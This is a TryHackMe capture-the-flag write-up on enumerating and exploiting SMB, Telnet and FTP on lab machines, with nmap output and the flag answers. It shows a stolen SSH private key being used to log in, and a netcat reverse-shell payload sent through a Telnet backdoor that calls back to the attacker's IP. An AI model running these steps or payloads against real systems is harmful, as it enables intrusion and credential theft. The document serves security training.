---
title: TryHackMe - Network Services
tags:
  - writeup
  - tryhackme
  - smb
  - telnet
  - ftp
---
Learn about, then enumerate and exploit a variety of network services and misconfigurations.

## Understanding SMB
#### SMB 101
SMB - Server Message Block Protocol - is a client-server communication protocol used for sharing access to files, printers, serial ports and other resources on a network. 

Servers make file systems and other resources (printers, named pipes, APIs) available to clients on the network. Client computers may have their own hard disks, but they also want access to the shared file systems and printers on the servers.

The SMB protocol is known as a response-request protocol, meaning that it transmits multiple messages between the client and server to establish a connection. Clients connect to servers using TCP/IP (actually NetBIOS over TCP/IP as specified in RFC1001 and RFC1002), NetBEUI or IPX/SPX.

#### How does SMB work?
Once they have established a connection, clients can then send commands (SMBs) to the server that allow them to access shares, open files, read and write files, and generally do all the sort of things that you want to do with a file system. However, in the case of SMB, these things are done over the network.

#### What runs SMB?
Microsoft Windows operating systems since Windows 95 have included client and server SMB protocol support. Samba, an open source server that supports the SMB protocol, was released for Unix systems.

#### Answer
What does SMB stand for?
- Server Message Block.

What type of protocol is SMB?    
- response-request.

What do clients connect to servers using?
- TCP/IP.

What systems does Samba run on?
- Unix.


## Enumerating SMB

#### Enumerating?
Enumeration is the process of gathering information on a target in order to find potential attack vectors and aid in exploitation.

This process is essential for an attack to be successful, as wasting time with exploits that either don't work or can crash the system can be a waste of energy. Enumeration can be used to gather usernames, passwords, network information, hostnames, application data, services, or any other information that may be valuable to an attacker.

#### Enumerating at SMB?
Typically, there are SMB share drives on a server that can be connected to and used to view or transfer files. SMB can often be a great starting point for an attacker looking to discover sensitive information.

#### Step 1 - Port Scanning
The first step of enumeration is to conduct a port scan, to find out as much information as you can about the services, applications, structure and operating system of the target machine. You can go as in depth as you like on this, however I suggest using `nmap` with the `-A` and `-p-` tags.
```bash
$ nmap -A -p- vulnerable.com

# -A : Enables OS Detection, Version Detection, Script Scanning and Traceroute all in one
# -p- : Enables scanning across all ports, not just the top 1000
```

#### Step 2 - Enum4Linux
If we found SMB's port is open, we can enumerate SMB shares on both Windows and Linux systems using Enum4Linux. It is basically a wrapper around the tools in the Samba package and makes it easy to quickly extract information from the target pertaining to SMB. 
```bash
$ enum4linux [options] ip

# Common function:
# -U    get userlist
# -M    get machine list
# -N    get namelist dump (different from -U and-M)
# -S    get sharelist
# -P    get password policy information
# -G    get group and member list
# -A    all of the above (full basic enumeration)
```

#### Answer
Conduct an **nmap** scan of your choosing, How many ports are open?
```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ nmap -A 10.10.88.18                         
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-06 21:39 EST
Nmap scan report for 10.10.88.18
Host is up (0.20s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 91:df:5c:7c:26:22:6e:90:23:a7:7d:fa:5c:e1:c2:52 (RSA)
|   256 86:57:f5:2a:f7:86:9c:cf:02:c1:ac:bc:34:90:6b:01 (ECDSA)
|_  256 81:e3:cc:e7:c9:3c:75:d7:fb:e0:86:a0:01:41:77:81 (ED25519)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: POLOSMB; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: POLOSMB, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: polosmb
|   NetBIOS computer name: POLOSMB\x00
|   Domain name: \x00
|   FQDN: polosmb
|_  System time: 2021-01-07T02:40:16+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-01-07T02:40:16
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 59.48 seconds                                                         
```
**3** ports are open as above nmap results.

What ports is **SMB** running on?
- Port **139/445**.

Let's get started with Enum4Linux, conduct a full basic enumeration. For starters, what is the workgroup name?  
```bash
┌──(kali㉿kali)-[~]
└─$ enum4linux -A 10.10.88.18
Unknown option: A
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed Jan  6 21:42:40 2021

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 10.10.88.18
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 =================================================== 
|    Enumerating Workgroup/Domain on 10.10.88.18    |
 =================================================== 
[+] Got domain/workgroup name: WORKGROUP

 =========================================== 
|    Nbtstat Information for 10.10.88.18    |
 =========================================== 
Looking up status of 10.10.88.18
        POLOSMB         <00> -         B <ACTIVE>  Workstation Service
        POLOSMB         <03> -         B <ACTIVE>  Messenger Service
        POLOSMB         <20> -         B <ACTIVE>  File Server Service
        ..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
        WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
        WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
        WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

        MAC Address = 00-00-00-00-00-00

 ==================================== 
|    Session Check on 10.10.88.18    |
 ==================================== 
[+] Server 10.10.88.18 allows sessions using username '', password ''

 ========================================== 
|    Getting domain SID for 10.10.88.18    |
 ========================================== 
Domain Name: WORKGROUP
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup

 ===================================== 
|    OS information on 10.10.88.18    |
 ===================================== 
Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
[+] Got OS info for 10.10.88.18 from smbclient: 
[+] Got OS info for 10.10.88.18 from srvinfo:
        POLOSMB        Wk Sv PrQ Unx NT SNT polosmb server (Samba, Ubuntu)
        platform_id     :       500
        os version      :       6.1
        server type     :       0x809a03

 ============================ 
|    Users on 10.10.88.18    |
 ============================ 
Use of uninitialized value $users in print at ./enum4linux.pl line 874.
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 877.

Use of uninitialized value $users in print at ./enum4linux.pl line 888.
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 890.

 ======================================== 
|    Share Enumeration on 10.10.88.18    |
 ======================================== 

        Sharename       Type      Comment
        ---------       ----      -------
        netlogon        Disk      Network Logon Service
        profiles        Disk      Users profiles
        print$          Disk      Printer Drivers
        IPC$            IPC       IPC Service (polosmb server (Samba, Ubuntu))

...
```
The **workgroup** name is **workgroup**.

What comes up as the name of the machine?        
- **polosmb**.

What operating system version is running?
- **6.1**.

What share sticks out as something we might want to investigate?
- **profiles**.



## Exploiting SMB

#### Types of SMB Exploit
While there are vulnerabilities such as [CVE-2017-7494](https://www.cvedetails.com/cve/CVE-2017-7494/) that can allow remote code execution by exploiting SMB, you're more likely to encounter a situation where the best way into a system is due to misconfigurations in the system. In this case, we're going to be exploiting anonymous SMB share access- a common misconfiguration that can allow us to gain information that will lead to a shell.

#### Using SMBClient to Exploit
Because we're trying to access an SMB share, we need a client to access resources on servers. We will be using SMBClient because it's part of the default samba suite. 

We can remotely access the SMB share using the syntax:
```bash
$ smbclient //[IP]/[SHARE]

# Followed by:
# -U [name] : to specify the user
# -p [port] : to specify the port
```

#### Answer
What would be the correct syntax to access an SMB share called "secret" as user "suit" on a machine with the IP 10.10.10.2 on the default port?
```bash
$ smbclient //10.10.10.2/secret -u suit -p 139
```

Does the share (previous machine) allow anonymous access? Y/N?
```bash
$ smbclient //10.10.88.18/profiles -p 139                                                     1 ⨯
Enter WORKGROUP\kali's password: 
Try "help" to get a list of possible commands.
smb: \>
```
The answer is **Y**es.  

Great! Have a look around for any interesting documents that could contain valuable information. Who can we assume this profile folder belongs to?
```bash
smb: \> dir
  .                                   D        0  Tue Apr 21 07:08:23 2020
  ..                                  D        0  Tue Apr 21 06:49:56 2020
  .cache                             DH        0  Tue Apr 21 07:08:23 2020
  .profile                            H      807  Tue Apr 21 07:08:23 2020
  .sudo_as_admin_successful           H        0  Tue Apr 21 07:08:23 2020
  .bash_logout                        H      220  Tue Apr 21 07:08:23 2020
  .viminfo                            H      947  Tue Apr 21 07:08:23 2020
  Working From Home Information.txt      N      358  Tue Apr 21 07:08:23 2020
  .ssh                               DH        0  Tue Apr 21 07:08:23 2020
  .bashrc                             H     3771  Tue Apr 21 07:08:23 2020
  .gnupg                             DH        0  Tue Apr 21 07:08:23 2020

                12316808 blocks of size 1024. 7584028 blocks available

smb: \> get "Working From Home Information.txt" 
getting file \Working From Home Information.txt of size 358 as Working From Home Information.txt (0.4 KiloBytes/sec) (average 0.4 KiloBytes/sec)
```
If we open the file, it's look like this:
```
John Cactus,

As you're well aware, due to the current pandemic most of POLO inc. has insisted that, wherever 
possible, employees should work from home. As such- your account has now been enabled with ssh
access to the main server.

If there are any problems, please contact the IT department at it@polointernalcoms.uk

Regards,

James
Department Manager 
```
So, the profile belongs to **John Cactus**.

What service has been configured to allow him to work from home?
- **ssh**.

Okay! Now we know this, what directory on the share should we look in?
- **.ssh**.

This directory contains authentication keys that allow a user to authenticate themselves on, and then access, a server. Which of these keys is most useful to us?
```bash
smb: \> cd .ssh
smb: \.ssh\> dir
  .                                   D        0  Tue Apr 21 07:08:23 2020
  ..                                  D        0  Tue Apr 21 07:08:23 2020
  id_rsa                              A     1679  Tue Apr 21 07:08:23 2020
  id_rsa.pub                          N      396  Tue Apr 21 07:08:23 2020
  authorized_keys                     N        0  Tue Apr 21 07:08:23 2020

                12316808 blocks of size 1024. 7584028 blocks available
smb: \.ssh\> get "id_rsa"
smb: \.ssh\> get "id_rsa.pub"
```

Download this file to your local machine, and change the permissions to "600" using "chmod 600 [file]". Now, use the information you have already gathered to work out the username of the account. Then, use the service and key to log-in to the server.

What is the smb.txt flag?
```bash
# cat the id_rsa.pub to see the username
$ cat id_rsa.pub                                                     
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDb7OaL8zLZ5Z8OU3wZPSIQHaoyI8Yc3I/8/Y6faWgYTZbfNPexli0jxdAeTeGy2X3XACWcB4HFejbiNsMYLjy517gwWKPBvN865i8uIQ0Gqayq/KmBHpuBbR0yX/SpyfyvzR3VD16pg/D+WT8hLaNHSYm6FNYLsmVnWDSJDBhS179czftuoW55mw/OqzWVr5ln9cKeeuXlNV1lqCjBqF3ClzEBvN4JW8GS/riLTeHcXeMIMUTuIpr4XovN/VivIlLqTYy7lHuUh6L2RqAfw5+FSr4QZW1zHCMoS6FooTomq/03EGJCGcp80/fT0e04n+7+PxnmvZQkOwe1A1hUG6C/ cactus@polosmb

# the username = cactus
# change the permission of id_rsa
$ chmod 600 id_rsa

# ssh to cactus@10.10.88.18
$ ssh cactus@10.10.88.18 -i id_rsa

Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-96-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Jan  7 03:09:09 UTC 2021

  System load:  0.08               Processes:           92
  Usage of /:   33.3% of 11.75GB   Users logged in:     0
  Memory usage: 17%                IP address for eth0: 10.10.88.18
  Swap usage:   0%


22 packages can be updated.
0 updates are security updates.


Last login: Tue Apr 21 11:19:15 2020 from 192.168.1.110
cactus@polosmb:~$ ls
smb.txt
cactus@polosmb:~$ cat smb.txt 
THM{smb_is_fun_eh?}
```
The flag is **THM{smb_is_fun_eh?}**.


## Understanding Telnet

#### Telnet?
Telnet is an application protocol which allows you, with the use of a telnet client, to connect to and execute commands on a remote machine that's hosting a telnet server.

The telnet client will establish a connection with the server. The client will then become a virtual terminal- allowing you to interact with the remote host.

Telnet sends all messages in clear text and has no specific security mechanisms. Thus, in many applications and services, Telnet has been replaced by SSH in most implementations.

#### How does Telnet work?
The user connects to the server by using the Telnet protocol, which means entering `telnet` into a command prompt. The user then executes commands on the server by using specific Telnet commands in the Telnet prompt. You can connect to a telnet server with the following syntax: `telnet [ip] [port]`.

#### Answer
What is Telnet?    
- **application protocol**.

What has slowly replaced Telnet?    
- **ssh**.

How would you connect to a Telnet server with the IP 10.10.10.3 on port 23?
```bash
$ telnet 10.10.10.3 23
```

The lack of what, means that all Telnet communication is in plaintext?
- **encryption**.


## Enumerating Telnet

#### Enumeration
We've already seen how key enumeration can be in exploiting a misconfigured network service. However, vulnerabilities that could be potentially trivial to exploit don't always jump out at us. For that reason, especially when it comes to enumerating network services, we need to be thorough in our method. 

#### Port Scanning
The first step of enumeration is to conduct a port scan, to find out as much information as you can about the services, applications, structure and operating system of the target machine. You can go as in depth as you like on this, however I suggest using `nmap` with the `-A` and `-p-` tags.
```bash
$ nmap -A -p- vulnerable.com

# -A : Enables OS Detection, Version Detection, Script Scanning and Traceroute all in one
# -p- : Enables scanning across all ports, not just the top 1000
```

#### Answer
Note: Deploy the machine first on this sub-category.

How many **ports** are open on the target machine?  
```bash
$ nmap -vv -p- -T5 10.10.230.252                                                            130 ⨯
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-06 23:09 EST
Initiating Ping Scan at 23:09
Scanning 10.10.230.252 [2 ports]
Completed Ping Scan at 23:09, 0.20s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 23:09
Completed Parallel DNS resolution of 1 host. at 23:09, 13.02s elapsed
Initiating Connect Scan at 23:09
Scanning 10.10.230.252 [65535 ports]
Warning: 10.10.230.252 giving up on port because retransmission cap hit (2).
Connect Scan Timing: About 2.81% done; ETC: 23:27 (0:17:53 remaining)
Connect Scan Timing: About 5.76% done; ETC: 23:27 (0:16:37 remaining)
Connect Scan Timing: About 8.94% done; ETC: 23:26 (0:15:27 remaining)
Discovered open port 8012/tcp on 10.10.230.252
Connect Scan Timing: About 13.64% done; ETC: 23:24 (0:12:46 remaining)
Connect Scan Timing: About 17.82% done; ETC: 23:23 (0:11:50 remaining)
...
```
Only **1** port open.

What **port** is this?
- **8012**.

This port is unassigned, but still lists the **protocol** it's using, what protocol is this?     
- **tcp**.

Now re-run the `nmap` scan, without the `-p-` tag, how many ports show up as open?
```bash
$ nmap -A -F 10.10.230.252
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-06 23:00 EST
Nmap scan report for 10.10.230.252
Host is up (0.20s latency).
All 100 scanned ports on 10.10.230.252 are closed

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.85 seconds
```
**0** port.

Here, we see that by assigning telnet to a **non-standard port**, it is not part of the common ports list, or top 1000 ports, that nmap scans. It's important to try every angle when enumerating, as the information you gather here will inform your exploitation stage.

Based on the title returned to us, what do we think this port could be **used for**?
```bash
$ nmap -A -p 8012 -T5 10.10.230.252
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-06 23:13 EST
Nmap scan report for 10.10.230.252
Host is up (0.20s latency).

PORT     STATE SERVICE VERSION
8012/tcp open  unknown
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NULL, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe: 
|_    SKIDY'S BACKDOOR. Type .HELP to view commands
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8012-TCP:V=7.91%I=7%D=1/6%Time=5FF68A96%P=x86_64-pc-linux-gnu%r(NUL
SF:L,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20commands
SF:\n")%r(GenericLines,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x
SF:20view\x20commands\n")%r(GetRequest,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x
SF:20\.HELP\x20to\x20view\x20commands\n")%r(HTTPOptions,2E,"SKIDY'S\x20BAC
SF:KDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20commands\n")%r(RTSPRequest,2
SF:E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20commands\n"
SF:)%r(RPCCheck,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\
SF:x20commands\n")%r(DNSVersionBindReqTCP,2E,"SKIDY'S\x20BACKDOOR\.\x20Typ
SF:e\x20\.HELP\x20to\x20view\x20commands\n")%r(DNSStatusRequestTCP,2E,"SKI
SF:DY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20commands\n")%r(He
SF:lp,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20command
SF:s\n")%r(SSLSessionReq,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to
SF:\x20view\x20commands\n")%r(TerminalServerCookie,2E,"SKIDY'S\x20BACKDOOR
SF:\.\x20Type\x20\.HELP\x20to\x20view\x20commands\n")%r(TLSSessionReq,2E,"
SF:SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20commands\n")%r
SF:(Kerberos,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20
SF:commands\n")%r(SMBProgNeg,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x
SF:20to\x20view\x20commands\n")%r(X11Probe,2E,"SKIDY'S\x20BACKDOOR\.\x20Ty
SF:pe\x20\.HELP\x20to\x20view\x20commands\n")%r(FourOhFourRequest,2E,"SKID
SF:Y'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20commands\n")%r(LPD
SF:String,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20com
SF:mands\n")%r(LDAPSearchReq,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x
SF:20to\x20view\x20commands\n")%r(LDAPBindReq,2E,"SKIDY'S\x20BACKDOOR\.\x2
SF:0Type\x20\.HELP\x20to\x20view\x20commands\n")%r(SIPOptions,2E,"SKIDY'S\
SF:x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20commands\n")%r(LANDesk
SF:-RC,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20comman
SF:ds\n")%r(TerminalServer,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20
SF:to\x20view\x20commands\n")%r(NCP,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\
SF:.HELP\x20to\x20view\x20commands\n");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 177.64 seconds
```
It's **a backdoor**.

Who could it belong to? Gathering possible **usernames** is an important step in enumeration.
- **skidy**.

Always keep a note of information you find during your enumeration stage, so you can refer back to it when you move on to try exploits.



## Exploiting Telnet

#### Types of Telnet Exploit
Telnet, being a protocol, is in and of itself insecure for the reasons we talked about earlier. It lacks encryption, so sends all communication over plaintext, and for the most part has poor access control. There are CVE's for Telnet client and server systems, however, so when exploiting you can check for those on:

- [https://www.cvedetails.com/](https://www.cvedetails.com/)
- [https://cve.mitre.org/](https://cve.mitre.org/)

A CVE, short for Common Vulnerabilities and Exposures, is a list of publicly disclosed computer security flaws. When someone refers to a CVE, they usually mean the CVE ID number assigned to a security flaw.

However, you're far more likely to find a misconfiguration in how telnet has been configured or is operating that will allow you to exploit it.

#### Step 1 - Connecting to Telnet
You can connect to a telnet server with the following syntax:
```bash
$ telnet [ip] [port]
```

#### Step 2 - Reverse Shell
<center><a href="/assets/images/tryhackme/network-services/rev.png"><img src="/assets/images/tryhackme/network-services/rev.png" /></a></center><br>

A reverse shell is a type of shell in which the target machine communicates back to the attacking machine.

The attacking machine has a listening port, on which it receives the connection, resulting in code or command execution being achieved.

#### Answer
Okay, let's try and connect to this telnet port! If you get stuck, have a look at the syntax for connecting outlined above.
```bash
$ telnet 10.10.230.252 8012  
Trying 10.10.230.252...
Connected to 10.10.230.252.
Escape character is '^]'.
SKIDY'S BACKDOOR. Type .HELP to view commands
```

Great! It's an open telnet connection! What welcome message do we receive?
- **SKIDY'S BACKDOOR.**

Let's try executing some commands, do we get a return on any input we enter into the telnet session? (Y/N).
```bash
$ telnet 10.10.230.252 8012  
Trying 10.10.230.252...
Connected to 10.10.230.252.
Escape character is '^]'.
SKIDY'S BACKDOOR. Type .HELP to view commands
.HELP
.HELP: View commands
 .RUN <command>: Execute commands
.EXIT: Exit
.RUN ls
```
The answer is **N**o.

Hmm... that's strange. Let's check to see if what we're typing is being executed as a system command. Run this tcpdump listener that spesifically listening for ICMP traffic.
```bash
$ sudo tcpdump ip proto \\icmp -i tun0
```

Now, use the command "ping [local THM ip] -c 1" through the telnet session to see if we're able to execute system commands. Do we receive any pings? Note, you need to preface this with .RUN (Y/N)
```bash
# run the command
$ telnet 10.10.230.252 8012 
Trying 10.10.230.252...
Connected to 10.10.230.252.
.RUN ping 10.11.25.205 -c

# tcpdump output
$ sudo tcpdump ip proto \\icmp -i tun0
[sudo] password for kali: 
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
23:35:38.242194 IP 10.10.230.252 > 10.11.25.205: ICMP echo request, id 1250, seq 1, length 64
23:35:38.242216 IP 10.11.25.205 > 10.10.230.252: ICMP echo reply, id 1250, seq 1, length 64
23:35:39.243159 IP 10.10.230.252 > 10.11.25.205: ICMP echo request, id 1250, seq 2, length 64
23:35:39.243172 IP 10.11.25.205 > 10.10.230.252: ICMP echo reply, id 1250, seq 2, length 64
```
The answer is **Y**es. Great! This means that we are able to execute system commands AND that we are able to reach our local machine. Now let's have some fun!Great! This means that we are able to execute system commands AND that we are able to reach our local machine. Now let's have some fun!
 
We're going to generate a reverse shell payload using msfvenom.This will generate and encode a netcat reverse shell for us. Here's our syntax:
```bash
$ msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R

# -p = payload
# lhost = our local host IP address (this is your machine's IP address)
# lport = the port to listen on (this is the port on your machine)
# R = export the payload in raw format
```

What word does the generated payload start with?
```
[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
[-] No arch selected, selecting arch: cmd from the payload
No encoder specified, outputting raw payload
Payload size: 94 bytes
mkfifo /tmp/qvfmt; nc 10.11.25.205 4444 0</tmp/qvfmt | /bin/sh >/tmp/qvfmt 2>&1; rm /tmp/qvfmt
```
It's **mkfifo**.

Perfect. We're nearly there. Now all we need to do is start a netcat listener on our local machine. We do this using:
```bash
$ nc -lvp [listening port]
```

What would the command look like for the listening port we selected in our payload?
```bash
$ nc -lvp 4444
```

Great! Now that's running, we need to copy and paste our msfvenom payload into the telnet session and run it as a command. Hopefully- this will give us a shell on the target machine!
```bash
$ telnet 10.10.230.252 8012   

Trying 10.10.230.252...
Connected to 10.10.230.252.
Escape character is '^]'.
.RUN mkfifo /tmp/qvfmt; nc 10.11.25.205 4444 0</tmp/qvfmt | /bin/sh >/tmp/qvfmt 2>&1; rm /tmp/qvfmt
```

Success! What is the contents of flag.txt?
```bash
$ nc -lvp 4444                                                                                1 ⨯
listening on [any] 4444 ...
ls
10.10.128.76: inverse host lookup failed: Host name lookup failure
connect to [10.11.25.205] from (UNKNOWN) [10.10.128.76] 53498
flag.txt
cat flag.txt
THM{y0u_g0t_th3_t3ln3t_fl4g}
```
The flag is **THM{y0u_g0t_th3_t3ln3t_fl4g}**.



## Understanding FTP

#### FTP?
File Transfer Protocol (FTP) is, as the name suggests, a protocol used to allow remote transfer of files over a network. It uses a client-server model to do this, and- as we'll come on to later- relays commands and data in a very efficient way.

#### How does FTP work?
A typical FTP session operates using two channels:
- a command (sometimes called the control) channel.
- a data channel.

As their names imply, the command channel is used for transmitting commands as well as replies to those commands, while the data channel is used for transferring data.

FTP operates using a client-server protocol. The client initiates a connection with the server, the server validates whatever login credentials are provided and then opens the session. While the session is open, the client may execute FTP commands on the server.

#### Active vs Passive FTP
The FTP server may support either Active or Passive connections, or both. 
- In an Active FTP connection, the client opens a port and listens. The server is required to actively connect to it. 
- In a Passive FTP connection, the server opens a port and listens (passively) and the client connects to it. 

This separation of command information and data into separate channels is a way of being able to send commands to the server without having to wait for the current data transfer to finish. If both channels were interlinked, you could only enter commands in between data transfers, which wouldn't be efficient for either large file transfers, or slow internet connections.

#### Answer
What communications model does FTP use?
- **client-server**.

What's the standard FTP port?
- **21**.

How many modes of FTP connection are there?    
- **2**, active and passive.



## Enumerating FTP

#### Methodology
Enumeration the FTP port first via `nmap`, then we're going to be exploiting an anonymous FTP login, to see what files we can access- and if they contain any information that might allow us to pop a shell on the system. This is a common pathway in CTF challenges, and mimics a real-life careless implementation of FTP servers.

#### Alternative
It's worth noting that some vulnerable versions of in.ftpd and some other FTP server variants return different responses to the "cwd" command for home directories which exist and those that don’t. This can be exploited because you can issue cwd commands before authentication, and if there's a home directory- there is more than likely a user account to go with it. While this bug is found mainly within legacy systems, it's worth knowing about, as a way to exploit FTP. More at [https://www.exploit-db.com/exploits/20745](https://www.exploit-db.com/exploits/20745).

#### Answer
Run an `nmap` scan of your choice.
```bash
$ nmap -vv -p- -T5 10.10.13.98
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-07 00:05 EST
Initiating Ping Scan at 00:05
Scanning 10.10.13.98 [2 ports]
Completed Ping Scan at 00:05, 0.20s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 00:05
Completed Parallel DNS resolution of 1 host. at 00:05, 13.00s elapsed
Initiating Connect Scan at 00:05
Scanning 10.10.13.98 [65535 ports]
Discovered open port 21/tcp on 10.10.13.98
Warning: 10.10.13.98 giving up on port because retransmission cap hit (2).
Connect Scan Timing: About 4.24% done; ETC: 00:17 (0:11:40 remaining)
Connect Scan Timing: About 7.34% done; ETC: 00:19 (0:12:50 remaining)
Connect Scan Timing: About 11.89% done; ETC: 00:19 (0:11:59 remaining)
Connect Scan Timing: About 17.45% done; ETC: 00:17 (0:10:01 remaining)
Connect Scan Timing: About 26.06% done; ETC: 00:18 (0:09:24 remaining)
Connect Scan Timing: About 26.99% done; ETC: 00:19 (0:10:20 remaining)
Connect Scan Timing: About 31.14% done; ETC: 00:21 (0:11:06 remaining)
Connect Scan Timing: About 32.55% done; ETC: 00:23 (0:11:57 remaining)
Connect Scan Timing: About 33.80% done; ETC: 00:25 (0:12:52 remaining)
Connect Scan Timing: About 39.94% done; ETC: 00:28 (0:13:52 remaining)
Connect Scan Timing: About 48.22% done; ETC: 00:29 (0:12:32 remaining)
Connect Scan Timing: About 53.54% done; ETC: 00:28 (0:10:34 remaining)
Connect Scan Timing: About 58.72% done; ETC: 00:27 (0:08:54 remaining)
Connect Scan Timing: About 63.00% done; ETC: 00:26 (0:07:47 remaining)
Connect Scan Timing: About 67.51% done; ETC: 00:26 (0:06:42 remaining)
Connect Scan Timing: About 71.91% done; ETC: 00:25 (0:05:39 remaining)
10.10.13.98 timed out during Connect Scan (0 hosts left)
Completed Connect Scan at 00:20, 899.86s elapsed (1 host timed out)
Nmap scan report for 10.10.13.98
Host is up, received conn-refused (0.20s latency).
Skipping host 10.10.13.98 due to host timeout
Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 913.10 seconds
```
How many **ports** are open on the target machine? 
- **2**.

What **port** is ftp running on?
- **21**.

What **variant** of FTP is running on it?  
```bash
$ nmap -A -T5 10.10.13.98          
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-07 00:04 EST
Nmap scan report for 10.10.13.98
Host is up (0.20s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
...
```
It's **vsftpd**.

Great, now we know what type of FTP server we're dealing with we can check to see if we are able to login anonymously to the FTP server. We can do this using by typing `ftp [IP]` into the console, and entering "anonymous", and no password when prompted.
```bash
$ ftp 10.10.13.98                                                                        
Connected to 10.10.13.98.
220 Welcome to the administrator FTP service.
Name (10.10.13.98:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

What is the name of the file in the anonymous FTP directory?
```bash
ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             353 Apr 24  2020 PUBLIC_NOTICE.txt
226 Directory send OK.
ftp> 
```
It's **PUBLIC_NOTICE.txt**.

What do we think a possible username could be?
```bash
# download the file
ftp> get PUBLIC_NOTICE.txt
local: PUBLIC_NOTICE.txt remote: PUBLIC_NOTICE.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for PUBLIC_NOTICE.txt (353 bytes).
226 Transfer complete.
353 bytes received in 0.00 secs (177.5111 kB/s)
```

Output from PUBLIC_NOTICE.txt:
```
===================================
MESSAGE FROM SYSTEM ADMINISTRATORS
===================================

Hello,

I hope everyone is aware that the
FTP server will not be available 
over the weekend- we will be 
carrying out routine system 
maintenance. Backups will be
made to my account so I reccomend
encrypting any sensitive data.

Cheers,

Mike 
```
So the possible username is **mike**.

